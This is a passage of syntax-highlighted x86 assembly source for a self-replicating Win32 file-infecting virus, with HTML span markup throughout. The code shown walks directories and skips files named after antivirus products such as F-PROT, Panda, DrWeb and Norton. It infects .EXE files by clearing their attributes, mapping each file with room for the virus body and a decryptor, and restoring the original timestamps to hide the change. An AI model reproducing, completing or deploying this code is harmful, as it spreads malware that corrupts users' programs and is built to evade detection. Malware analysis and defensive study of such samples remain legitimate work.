                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0"> </span><span class="sc1">; Infect only the 50% of the files</span><span class="sc0">
                           </span><span class="sc1">; but based on our genetic algorithm. By evolution,</span><span class="sc0">
                           </span><span class="sc1">; only the more spreaded or the more stealthy will</span><span class="sc0">
                           </span><span class="sc1">; "survive".</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">       </span><span class="sc1">; EDX = offset to the file name</span><span class="sc0">

</span><span class="sc1">;; Uncomment this for debugging the virus. With this code the virus will only</span><span class="sc0">
</span><span class="sc1">;; infect files starting with "goat"</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [edx]</span><span class="sc0">
</span><span class="sc1">;                 and     eax, 1F1F1F1Fh</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 'taog' AND 1F1F1F1Fh</span><span class="sc0">
</span><span class="sc1">;                 jnz   @@InfectNextFile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the two first letters</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1F1Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'-F'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1Fh</span><span class="sc0">  </span><span class="sc1">; Check for F-PROT</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">       </span><span class="sc1">; If it is, avoid the infection</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AP'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1Fh</span><span class="sc0">  </span><span class="sc1">; Check for PANDA</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'CS'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1Fh</span><span class="sc0">  </span><span class="sc1">; Check for SCAN*, SCN*, etc.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RD'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1Fh</span><span class="sc0">  </span><span class="sc1">; Check for DRWEB</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ON'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1Fh</span><span class="sc0">  </span><span class="sc1">; Check for NOD-ICE, NORTON, etc.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
     </span><span class="sc5">@@LoopFindExtension</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Avoid files with a "V" in the name.</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc0">     </span><span class="sc1">; With that we avoid AVP, NAV, and lots</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0"> </span><span class="sc1">; of antivirus.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@InfectNextFile</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@CheckExtension</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopFindExtension</span><span class="sc0">
     </span><span class="sc5">@@CheckExtension</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Finally, is it an EXE file?</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1F1F1FFFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1F1F1FFFh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@InfectNextFile</span><span class="sc0">   </span><span class="sc1">; If not, don't infect!</span><span class="sc0">

      </span><span class="sc5">@@InfectFile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TouchFile</span><span class="sc0">   </span><span class="sc1">; Infect the file with our brand recently</span><span class="sc0">
      </span><span class="sc5">@@InfectNextFile</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; reassembled code.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFileData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFindFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindNextFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Find the next file/dir of</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; the directory</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; If error, finish</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@TouchAgain</span><span class="sc0">
      </span><span class="sc5">@@Error2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFindFile</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Close the FindFile handle</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FindClose</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">
      </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectFiles2</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function infects the file. It saves the original attributes, clears</span><span class="sc0">
</span><span class="sc1">;; them (removing any read-only setting), opens a mapping of the file and</span><span class="sc0">
</span><span class="sc1">;; performs all the operations. After that, it uses the info in the FindFile</span><span class="sc0">
</span><span class="sc1">;; data to restore the original date/time, restores the attributes and exits.</span><span class="sc0">
</span><span class="sc5">TouchFile</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_FilePath</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Save the file path address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If there was an error getting</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; the attributes just exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error_</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Save the attributes</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Addr_FilePath</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set normal file attributes</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error_</span><span class="sc0">               </span><span class="sc1">; If error, finish</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; OPEN_EXISTING</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C0000000h</span><span class="sc0"> </span><span class="sc1">; Generic read &amp; write</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Open the file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; If error, finish</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetFileSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; Get the current file size.</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error2</span><span class="sc0">            </span><span class="sc1">; If error, finish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Set the tracking size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OriginalFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set the original size</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RoundedSizeOfNewCode</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; Maximum size of decryptor</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; PAGE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hFile</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Create a file mapping with a</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; size of original file's size +</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_CreateFileMappingA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; + the new size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; of the virus + the maximum</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">; size we use for a decryptor</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error2</span><span class="sc0">                </span><span class="sc1">; If error, just finish</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hMapping</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0F001Fh</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">; Map a view of the file mapping</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error3</span><span class="sc0">             </span><span class="sc1">; If error, exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MappingAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the address</span><span class="sc0">

     </span><span class="sc1">; Needed variables:</span><span class="sc0">
     </span><span class="sc1">; [MappingAddress] = Mapping address of file. The mapping</span><span class="sc0">
     </span><span class="sc1">;  must have the size of the two holes already increased.</span><span class="sc0">
     </span><span class="sc1">; Return:</span><span class="sc0">
     </span><span class="sc1">;  EAX = 0 if everything is OK,</span><span class="sc0">
     </span><span class="sc1">;   [HeaderAddress] = PE header address</span><span class="sc0">
     </span><span class="sc1">;   [Phys_TextHole] = Physical address of hole in code section</span><span class="sc0">
     </span><span class="sc1">;   [RVA_TextHole] = Virtual address of hole in code section</span><span class="sc0">
     </span><span class="sc1">;   [Phys_DataHole] = Physical address of hole in data section</span><span class="sc0">
     </span><span class="sc1">;   [RVA_DataHole] = Virtual Address of hole in data section</span><span class="sc0">
     </span><span class="sc1">;   [ExitProcessAddress] != 0 if ExitProcess was found and</span><span class="sc0">
     </span><span class="sc1">;     patched to point to the zone the decryptor is going to be.</span><span class="sc0">
     </span><span class="sc1">;  EAX != 0 if something failed</span><span class="sc0">
